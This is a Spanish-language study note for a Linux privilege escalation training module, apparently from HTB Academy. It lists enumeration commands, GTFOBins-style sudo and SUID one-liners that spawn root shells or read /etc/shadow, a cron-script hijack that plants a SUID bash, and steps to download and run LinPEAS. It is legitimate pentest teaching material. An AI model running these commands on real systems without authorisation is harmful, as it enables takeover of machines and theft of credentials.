---
title: "HTB Academy - Linux Privilege Escalation"
category: privilege-escalation
difficulty: medium
tags: ["privilege-escalation", "linux", "sudo", "suid", "htb-academy", "pentesting"]
date: 2026-02-17
status: ready
platform: HTB
---

# 🎓 HTB Academy - Linux Privilege Escalation

## 🎭 Escalada de Privilegios en Linux

---

👨‍🏫 **Del Instructor**: Bienvenido al módulo de Privilege Escalation. Como Pentester, obtener acceso inicial es solo el primer paso. La escalada de privilegios te permite pasar de usuario estándar a root, completando la cadena de ataque y demostrando el impacto real de la vulnerabilidad.

> 🎯 **Mentalidad de Hacker**: "El acceso inicial es solo la puerta de entrada. El verdadero valor está en lo que puedes hacer después. Cada sistema tiene debilidades que permiten escalar - tu trabajo es encontrarlas."

---

## 🎭 El Escenario: Post-Exploitation

### Contexto del Pentest

Has obtenido acceso a un servidor Linux mediante una vulnerabilidad web. Tu shell inicial es como usuario `www-data`. Tu objetivo es escalar a `root` para demostrar el impacto completo del compromiso.

**Tu misión como Pentester**:
- Enumerar el sistema buscando vectores de escalada
- Identificar binarios SUID vulnerables
- Explotar configuraciones sudo incorrectas
- Documentar el camino al root

## 🧠 Fundamentos de Análisis: Privilege Escalation Vectors

### Vectores Comunes de Escalada

```
Privilege Escalation Attack Tree:
├── Kernel Exploits
│   └── Dirty COW, Heap Spray
├── SUID Binaries
│   └── find, nmap, vim, cp
├── Sudo Misconfigurations
│   └── NOPASSWD, GTFOBins
├── Cron Jobs
│   └── Wildcards, Path injection
├── Capabilities
│   └── cap_setuid, cap_net_raw
└── Stored Credentials
    └── .bash_history, config files
```

### Herramientas de Enumeración

| Herramienta | Función |
|-------------|---------|
| `linpeas.sh` | Enumeración automática |
| `linux-exploit-suggester` | Kernel exploits |
| `find` | SUID/SGID binaries |
| `sudo -l` | Sudo permissions |

## 🔍 Metodología de Investigación

### Paso 1: Enumeración Manual Inicial

```bash
# Información del sistema
uname -a
cat /etc/os-release
hostname

# Usuario actual
id
whoami
groups

# Buscar SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Buscar SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Sudo permissions
sudo -l
```

### Paso 2: Análisis de SUID Binaries

```bash
# Lista común de SUID vulnerables
# Verificar si existen:
ls -la /usr/bin/find
ls -la /usr/bin/nmap
ls -la /usr/bin/vim
ls -la /usr/bin/cp
ls -la /bin/mount

# Si find es SUID:
find / -exec whoami \; -quit
# Output: root (¡Escalada exitosa!)

# Si nmap antiguo es SUID:
nmap --interactive
nmap> !sh
# Shell como root

# GTFOBins - buscar exploits
# https://gtfobins.github.io/
```

### Paso 3: Análisis de Sudo

```bash
# Ver permisos sudo
sudo -l

# Ejemplos peligrosos comunes:
# (root) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/sh \;

# (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'

# (root) NOPASSWD: /usr/bin/cat
sudo cat /etc/shadow

# (root) NOPASSWD: /usr/bin/python
sudo python -c 'import os; os.system("/bin/sh")'

# (root) NOPASSWD: /usr/bin/perl
sudo perl -e 'exec "/bin/sh";'
```

### Paso 4: Análisis de Cron Jobs

```bash
# Ver cron jobs del sistema
cat /etc/crontab
ls -la /etc/cron.*

# Ver cron del usuario actual
crontab -l

# Buscar scripts escribibles
find /etc/cron* -writable 2>/dev/null

# Si un cron corre como root y es escribible:
echo '#!/bin/bash' > /path/to/script.sh
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /path/to/script.sh

# Esperar a que se ejecute o forzar
/tmp/bash -p  # Obtiene shell root
```

### Paso 5: Usar LinPEAS (Automatizado)

```bash
# Descargar LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh

# Ejecutar
./linpeas.sh

# LinPEAS colorea automáticamente:
# 🔴 Rojo = Alto riesgo
# 🟡 Amarillo = Riesgo medio
# 🟢 Verde = Informativo

# Buscar en output:
# - SUID binaries (rojo)
# - Sudo misconfig (rojo)
# - Writable files (amarillo)
# - Credentials in files (rojo)
```

## 🛠️ Arsenal de Herramientas

| Herramienta | Uso | Comando |
|-------------|-----|---------|
| `linpeas.sh` | Enumeración completa | `./linpeas.sh` |
| `sudo -l` | Ver permisos sudo | `sudo -l` |
| `find` | Buscar SUID | `find / -perm -4000` |
| `GTFOBins` | Exploits para binarios | https://gtfobins.github.io |
| `pspy` | Monitor de procesos | `./pspy64` |

## ✅ Checklist de Verificación

- [ ] Enumeración básica del sistema
- [ ] Identificar SUID binaries
- [ ] Verificar permisos sudo
- [ ] Analizar cron jobs
- [ ] Buscar capabilities
- [ ] Revisar archivos de credenciales
- [ ] Documentar vector de escalada
- [ ] Obtener acceso root

## 🎓 Lo Que Acabas de Aprender

**Habilidades Técnicas**:
- Enumeración manual de vectores de escalada
- Uso de herramientas automatizadas (LinPEAS)
- Explotación de SUID binaries
- Abuso de sudo misconfigurations

**Mentalidad de Pentester**:
- **Enumeración exhaustiva**: Nunca asumir, siempre verificar
- **Documentación**: Registrar cada vector probado
- **Creatividad**: Combinar técnicas para escalada

## 🚀 Próximos Pasos

1. **Windows Privilege Escalation**: Técnicas para sistemas Windows
2. **Active Directory**: Escalada en entornos de dominio
3. **Persistence**: Mantener acceso después de escalada
4. **Looting**: Extraer información sensible

## 📚 Recursos HTB Academy

- [HTB Academy - Linux PrivEsc Module](https://academy.hackthebox.com/module/details/51)
- [GTFOBins](https://gtfobins.github.io/)
- [LinPEAS GitHub](https://github.com/carlospolop/PEASS-ng)
- [PayloadsAllTheThings - PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

## ✅ Estado

**LISTO PARA COMPLETAR** 🔵

- 📅 Fecha: 2026-02-17
- ⏱️ Tiempo estimado: 40 minutos
- 🎯 Dificultad: Media (HTB Academy Intermediate)